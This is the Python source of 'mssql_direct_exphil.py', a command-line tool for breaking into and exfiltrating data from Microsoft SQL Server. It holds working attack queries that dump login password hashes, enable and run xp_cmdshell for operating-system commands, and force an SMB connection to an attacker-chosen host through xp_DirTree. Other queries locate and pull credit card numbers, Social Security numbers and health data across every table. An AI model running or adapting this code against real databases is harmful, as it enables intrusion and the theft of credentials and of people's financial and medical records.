#!/usr/bin/env python
# mssql_direct_exphil.py - Commandline MSSQL Server Data Exfiltration Tool
# v0.04 2014/12/31
#
# Copyright (C); 2014 jnqpblc - jnqpblc at gmail
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option); any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import argparse

parser = argparse.ArgumentParser(description='mssql_direct_exphil.py - Commandline MSSQL Server Data Exfiltration Tool');
parser.add_argument('-l', '--log', dest='outFile', required=False, default='query.log',
		help='A log file for the last query result.');
parser.add_argument('-s', '--server', dest='dbHost', required=True,
		help='The database server.');
parser.add_argument('-u', '--user', dest='dbUser', required=True,
		help='The database username.');
parser.add_argument('-p', '--password', dest='dbPass', required=True,
		help='The database password.');
parser.add_argument('-d', '--database', dest='dbName', required=True,
		help='The database.');
parser.add_argument('-t', '--table', dest='dbTable',
		help='A specific database table.');
parser.add_argument('-c', '--column', dest='dbColumn',
		help='A specific database column.');
parser.add_argument('-q', '--query', dest='dbQuery',
		help='The query to run against the database.');

# Investigation
parser.add_argument('--version', action='store_true',
		help='Get the database version string.');
parser.add_argument('--current-user', action='store_true',
		help='Get the current user.');
parser.add_argument('--system-user', action='store_true',
		help='Get the database system user.');
parser.add_argument('--is-dba', action='store_true',
		help='Am I a sysadmin?');
parser.add_argument('--list-dba', action='store_true',
		help='List all sysadmin accounts.');
parser.add_argument('--blank-pwds', action='store_true',
		help='Check for accounts with blank passwords.');
parser.add_argument('--get-hashes', action='store_true',
		help='Got MSSQL 2005/2008/2012 hashes?');
parser.add_argument('--get-hashes-2000', action='store_true',
		help='Got MSSQL 2000 hashes?');
parser.add_argument('--is-xpcmdshell', action='store_true',
		help='Is xp_cmdshell enabled?');
parser.add_argument('--enable-xpcmdshell', action='store_true',
		help='Enable xp_cmdshell, Got Root?');
parser.add_argument('-x', '--xp-cmdshell', dest='xp_cmdshell',
		help='Use xp_cmdshell to execute OS commands.');

# DB Exploration
parser.add_argument('--dbs', action='store_true',
		help='List all databases.');
parser.add_argument('--dbs-size', action='store_true',
		help='List all databases with file size.');
parser.add_argument('--dbs-file', action='store_true',
		help='List all databases with file path.');
parser.add_argument('--tables', action='store_true',
		help='List all tables for a given db.');
parser.add_argument('--views', action='store_true',
		help='List all views for a given db.');
parser.add_argument('--scalar-fn', action='store_true',
		help='List all scalar functions for a given db.');
parser.add_argument('--stored-procs', action='store_true',
		help='List all stored procs for a given db.');
parser.add_argument('--extended-procs', action='store_true',
		help='List all extended stored procs for a given db.');
parser.add_argument('--triggers', action='store_true',
		help='List all triggers for a given db.');
parser.add_argument('--xtypes', action='store_true',
		help='List all unique xtypes for a given db.');
parser.add_argument('--dump-columns', action='store_true',
		help='Dump all columns for every table in a given db.');

# Table Exploration
parser.add_argument('--columns', action='store_true',
		help='List all columns for a given table.');
parser.add_argument('--top-10', action='store_true',
		help='List the TOP 10 records for a given table.');
parser.add_argument('--dump-table', action='store_true',
		help='Dump the contents of a given table.');
parser.add_argument('--find-targets', action='store_true',
		help='List all possible columns containing sensitive data.');
parser.add_argument('--find-pans', action='store_true',
		help='List TOP 1 of every column containing credit cards.');
parser.add_argument('--find-ssns', action='store_true',
		help='List TOP 1 of every column containing ssn.');
parser.add_argument('--find-hippa', action='store_true',
		help='List TOP 1 of every column containing health ins. ids.');
parser.add_argument('--find-icds', action='store_true',
		help='List TOP 1 of every column containing ICD9/10 codes.');
parser.add_argument('--count-all-records', action='store_true',
		help='Count all records in every table.');

# Column Exploration
parser.add_argument('--peek', action='store_true',
		help='List the TOP 10 records for a given column.');
parser.add_argument('--find-malware', action='store_true',
		help='Search all records for injected scripts.');
parser.add_argument('--grep-database', dest='dbSearch',
		help='Search all records for an arbitrary string.');
		
# Database Attacks
parser.add_argument('--smb-connect', dest='smb_connect',
		help='Force the server to access a remote share.');

args = parser.parse_args();

import os
import sys
import subprocess as subp
import pymssql

# Setup the database connection
def dbConn(dbUser, dbPass, dbName, dbHost):
	try:
		db = pymssql.connect(host=dbHost, user=dbUser, password=dbPass, database=dbName);
		return db
	except Exception,e:
		print('ERROR: Unable to connect to MSSQL Server');
		print(e);
		sys.exit();

# Parse the query results
log = open(args.outFile, 'w');
def dispResults(sqlResult):
	i=0
	while( i < len(sqlResult)):
		log.write(str(sqlResult[i]));
		i+=1
		if (i < len(sqlResult)):
			log.write(',');
	log.write('\n');

db = dbConn(args.dbUser, args.dbPass, args.dbName, args.dbHost);
cur = db.cursor();
j=0
try:
	if args.version == True:
		cur.execute("USE master; SELECT @@version;");
	elif args.current_user == True:
		cur.execute("USE master; SELECT user_name();");
	elif args.system_user == True:
		cur.execute("USE master; SELECT system_user;");
	elif args.is_dba == True:
		cur.execute("USE master; SELECT is_srvrolemember('sysadmin');");
	elif args.list_dba == True:
		cur.execute("USE master; SELECT name FROM master..syslogins WHERE sysadmin = '1';");
	elif args.blank_pwds == True:
		cur.execute("SELECT name FROM sys.sql_logins WHERE PWDCOMPARE('', password_hash) = 1 ;");
	elif args.get_hashes == True:
		cur.execute("USE master; SELECT name, password_hash FROM master.sys.sql_logins;");
	elif args.get_hashes_2000 == True:
		cur.execute("USE master; SELECT name, password FROM master..sysxlogins;");
	elif args.is_xpcmdshell == True:
		cur.execute("USE master; SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = 'xp_cmdshell';");
	elif args.enable_xpcmdshell == True:
		# Broke
		cur.execute("USE master; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
	elif args.xp_cmdshell is not None:
		cur.execute("USE master; EXEC xp_cmdshell '" + args.xp_cmdshell + "';");
	elif args.dbs == True:
		cur.execute("USE master; SELECT name FROM master..sysdatabases WHERE dbid > 4 ORDER BY name asc;");
	elif args.dbs_size == True:
		print('\n=========================\n= DATABASE,SIZE,REMARKS =\n=========================\n')
		cur.execute("USE master; EXEC sp_databases;");
	elif args.dbs_file == True:
		print('\n===================================\n= DATABASE,CREATION DATE,FILEPATH =\n===================================\n')
		cur.execute("USE master; SELECT name,crdate,filename FROM master..sysdatabases WHERE dbid > 4 ORDER BY name asc;");
	elif args.tables == True:
		cur.execute("USE " + args.dbName + "; SELECT name FROM " + args.dbName + "..sysobjects WHERE xtype = 'U' ORDER BY name asc;");
	elif args.views == True:
		cur.execute("USE " + args.dbName + "; SELECT name FROM " + args.dbName + "..sysobjects WHERE xtype = 'V' ORDER BY name asc;");
	elif args.scalar_fn == True:
		cur.execute("USE " + args.dbName + "; SELECT name FROM " + args.dbName + "..sysobjects WHERE xtype = 'TR' ORDER BY name asc;");
	elif args.stored_procs == True:
		cur.execute("USE " + args.dbName + "; SELECT name FROM " + args.dbName + "..sysobjects WHERE xtype = 'P' ORDER BY name asc;");
	elif args.extended_procs == True:
		cur.execute("USE " + args.dbName + "; SELECT name FROM " + args.dbName + "..sysobjects WHERE xtype = 'X' ORDER BY name asc;");
	elif args.triggers == True:
		cur.execute("USE " + args.dbName + "; SELECT name FROM " + args.dbName + "..sysobjects WHERE xtype = 'TR' ORDER BY name asc;");
	elif args.xtypes == True:
		cur.execute("USE " + args.dbName + "; SELECT DISTINCT xtype FROM " + args.dbName + "..sysobjects ORDER BY xtype asc;");
	elif args.dump_columns == True:
		cur.execute("USE " + args.dbName + "; SELECT TABLE_NAME,COLUMN_NAME,DATA_TYPE FROM " + args.dbName + ".INFORMATION_SCHEMA.COLUMNS ORDER BY TABLE_NAME,COLUMN_NAME asc;");
	elif args.columns == True:
		if args.dbTable is not None:
			cur.execute("USE " + args.dbName + "; SELECT COLUMN_NAME,DATA_TYPE FROM " + args.dbName + ".INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '" + args.dbTable + "' ORDER BY COLUMN_NAME asc;");
		else:
			print('\nPlease supply a table name. -t or --table\n');
			sys.exit();
	elif args.top_10 == True:
		if args.dbTable is not None:
			cur.execute("USE " + args.dbName + "; SELECT TOP 10 * FROM " + args.dbName + ".dbo." + args.dbTable + ";");
		else:
			print('\nPlease supply a table name. -t or --table\n');
			sys.exit();
	elif args.dump_table == True:
		if args.dbTable is not None:
			cur.execute("USE " + args.dbName + "; SELECT * FROM " + args.dbName + ".dbo." + args.dbTable + ";");
		else:
			print('\nPlease supply a table name. -t or --table\n');
			sys.exit();
	elif args.find_targets == True:
		print('\n================\n= TABLE,COLUMN =\n================\n')
		cur.execute("USE " + args.dbName + "; SELECT TABLE_NAME,COLUMN_NAME FROM " + args.dbName + ".INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%ssn%' OR COLUMN_NAME LIKE '%social%' OR COLUMN_NAME LIKE '%credit%' OR COLUMN_NAME LIKE '%card%' OR COLUMN_NAME LIKE '%ccnum%' OR COLUMN_NAME LIKE '%bank%' OR COLUMN_NAME LIKE '%bacct%' OR COLUMN_NAME LIKE '%acct%' OR COLUMN_NAME LIKE '%pass%' OR COLUMN_NAME LIKE '%pwd%' OR COLUMN_NAME LIKE '%secret%';");
	elif args.find_pans == True:
		print('\n=======================\n= TABLE,COLUMN,RECORD =\n=======================\n')
		cur.execute("USE " + args.dbName + "; DECLARE @sql NVARCHAR(max); SELECT @sql = STUFF((SELECT ' UNION ALL SELECT TOP 1 ''' + TABLE_NAME + ''' AS tbl, ''' + COLUMN_NAME + ''' AS col, [' + COLUMN_NAME + '] AS val' + ' FROM ' + TABLE_SCHEMA + '.[' + TABLE_NAME + '] WHERE [' + COLUMN_NAME + '] IS NOT NULL AND [' + COLUMN_NAME + '] LIKE ''4[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]%'' OR [' + COLUMN_NAME + '] LIKE ''5[12345][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]'' OR [' + COLUMN_NAME + '] LIKE ''3[047][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]%'' OR [' + COLUMN_NAME + '] LIKE ''30[0-6][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]'' OR [' + COLUMN_NAME + '] LIKE ''3[6-8][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]%'' OR [' + COLUMN_NAME + '] LIKE ''6011[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]%'' OR [' + COLUMN_NAME + '] LIKE ''65[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]%'' OR [' + COLUMN_NAME + '] LIKE ''2131[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]%'' OR [' + COLUMN_NAME + '] LIKE ''1800[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]%'' OR [' + COLUMN_NAME + '] LIKE ''35[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]%''' FROM INFORMATION_SCHEMA.COLUMNS WHERE DATA_TYPE in ('nvarchar', 'varchar', 'char') FOR XML PATH('')) ,1, 11, ''); Exec (@sql)");
	elif args.find_ssns == True:
		print('\n=======================\n= TABLE,COLUMN,RECORD =\n=======================\n')
		cur.execute("USE " + args.dbName + "; DECLARE @sql NVARCHAR(max); SELECT @sql = STUFF((SELECT ' UNION ALL SELECT TOP 1 ''' + TABLE_NAME + ''' AS tbl, ''' + COLUMN_NAME + ''' AS col, [' + COLUMN_NAME + '] AS val' + ' FROM ' + TABLE_SCHEMA + '.[' + TABLE_NAME + '] WHERE [' + COLUMN_NAME + '] IS NOT NULL AND [' + COLUMN_NAME + '] LIKE ''[1-7][0-9][0-9][- ][0-9][0-9][- ][0-9][0-9][0-9][0-9]'' OR [' + COLUMN_NAME + '] LIKE ''[1-7][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]''' FROM INFORMATION_SCHEMA.COLUMNS WHERE DATA_TYPE in ('nvarchar', 'varchar', 'char') FOR XML PATH('')) ,1, 11, ''); Exec (@sql);");
	elif args.find_hippa == True:
		print('\n=======================\n= TABLE,COLUMN,RECORD =\n=======================\n')
		cur.execute("USE " + args.dbName + "; DECLARE @sql NVARCHAR(max); SELECT @sql = STUFF((SELECT ' UNION ALL SELECT TOP 1 ''' + TABLE_NAME + ''' AS tbl, ''' + COLUMN_NAME + ''' AS col, [' + COLUMN_NAME + '] AS val' + ' FROM ' + TABLE_SCHEMA + '.[' + TABLE_NAME + '] WHERE [' + COLUMN_NAME + '] IS NOT NULL AND [' + COLUMN_NAME + '] LIKE ''[a-zA-Z][a-zA-Z][a-zA-Z][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]''' FROM INFORMATION_SCHEMA.COLUMNS WHERE DATA_TYPE in ('nvarchar', 'varchar', 'char') FOR XML PATH('')) ,1, 11, ''); Exec (@sql);");
	elif args.find_icds == True:
		print('\n=======================\n= TABLE,COLUMN,RECORD =\n=======================\n')
		cur.execute("USE " + args.dbName + "; DECLARE @sql NVARCHAR(max); SELECT @sql = STUFF((SELECT ' UNION ALL SELECT TOP 1 ''' + TABLE_NAME + ''' AS tbl, ''' + COLUMN_NAME + ''' AS col, [' + COLUMN_NAME + '] AS val' + ' FROM ' + TABLE_SCHEMA + '.[' + TABLE_NAME + '] WHERE [' + COLUMN_NAME + '] IS NOT NULL AND [' + COLUMN_NAME + '] LIKE ''[0-9][0-9][0-9][.][0-9]'' OR [' + COLUMN_NAME + '] LIKE ''[0-9][0-9][0-9][.][0-9][0-9]'' OR [' + COLUMN_NAME + '] LIKE ''[0-9a-zA-Z][0-9a-zA-Z][0-9a-zA-Z][.][0-9a-zA-Z][0-9a-zA-Z][0-9a-zA-Z]'' OR [' + COLUMN_NAME + '] LIKE ''[0-9a-zA-Z][0-9a-zA-Z][0-9a-zA-Z][.][0-9a-zA-Z][0-9a-zA-Z][0-9a-zA-Z][0-9a-zA-Z]'' OR [' + COLUMN_NAME + '] LIKE ''[Dd][0-9][0-9][0-9][0-9]''' FROM INFORMATION_SCHEMA.COLUMNS WHERE DATA_TYPE in ('nvarchar', 'varchar', 'char') FOR XML PATH('')) ,1, 11, ''); Exec (@sql);");
	elif args.count_all_records == True:
		print('\n=================\n= TABLE,RECORDS =\n=================\n')
		cur.execute("USE " + args.dbName + "; CREATE TABLE #rowcount([name] NVARCHAR(128),[rows] INT,reserved VARCHAR(18),data VARCHAR(18),index_size VARCHAR(18),unused VARCHAR(18)); INSERT #rowcount EXEC sp_msforeachtable 'EXEC sp_spaceused [?]'; SELECT name,rows FROM #rowcount WHERE rows > 0 ORDER BY rows desc; DROP TABLE #rowcount;");
	elif args.peek == True:
		if args.dbTable is not None:
			if args.dbColumn is not None:
				cur.execute("USE " + args.dbName + "; SELECT TOP 10 " + args.dbColumn + " FROM " + args.dbName + ".dbo." + args.dbTable + " WHERE " + args.dbColumn + " IS NOT NULL;");
			else:
				print('\nPlease supply a column name. -c or --columns\n');
				sys.exit();
		else:
			print('\nPlease supply a table name. -t or --table\n');
			sys.exit();
	elif args.find_malware == True:
		print('\n=======================\n= TABLE,COLUMN,RECORD =\n=======================\n')
		cur.execute("USE " + args.dbName + "; DECLARE @searchstring  NVARCHAR(255); SET @searchstring = '%src=%'; DECLARE @sql NVARCHAR(max); SELECT @sql = STUFF((SELECT ' UNION ALL SELECT ''' + TABLE_NAME + ''' AS tbl, ''' + COLUMN_NAME + ''' AS col, [' + COLUMN_NAME + '] AS val' + ' FROM ' + TABLE_SCHEMA + '.[' + TABLE_NAME + '] WHERE [' + COLUMN_NAME + '] LIKE ''' + @searchstring + '''' FROM INFORMATION_SCHEMA.COLUMNS WHERE DATA_TYPE in ('nvarchar', 'varchar', 'char', 'ntext') FOR XML PATH('')) ,1, 11, ''); Exec (@sql)");
	elif args.dbSearch is not None:
		cur.execute("USE " + args.dbName + "; DECLARE @searchstring  NVARCHAR(255); SET @searchstring = '%" + args.dbSearch + "%'; DECLARE @sql NVARCHAR(max); SELECT @sql = STUFF((SELECT ' UNION ALL SELECT ''' + TABLE_NAME + ''' AS tbl, ''' + COLUMN_NAME + ''' AS col, [' + COLUMN_NAME + '] AS val' + ' FROM ' + TABLE_SCHEMA + '.[' + TABLE_NAME + '] WHERE [' + COLUMN_NAME + '] LIKE ''' + @searchstring + '''' FROM INFORMATION_SCHEMA.COLUMNS WHERE DATA_TYPE in ('nvarchar', 'varchar', 'char', 'ntext') FOR XML PATH('')) ,1, 11, ''); Exec (@sql)");
	elif args.smb_connect is not None:
		cur.execute("EXEC Master.dbo.xp_DirTree '\\" + args.smb_connect + "\share',1,1;");
	elif args.dbQuery is not None:
		cur.execute(args.dbQuery);
	else:
		print('\nNo query options have been selected. Please use -h or --help to see the help menu.\n');
		sys.exit();
	row = cur.fetchone();
	while row:
		dispResults(row);
		row = cur.fetchone();
		j+=1

except Exception,e:
	print(e);

db.close();

print('\n');
output = subp.Popen('egrep "[0-9a-zA-Z]" ' + args.outFile + ';echo', shell=True, stdout=True);
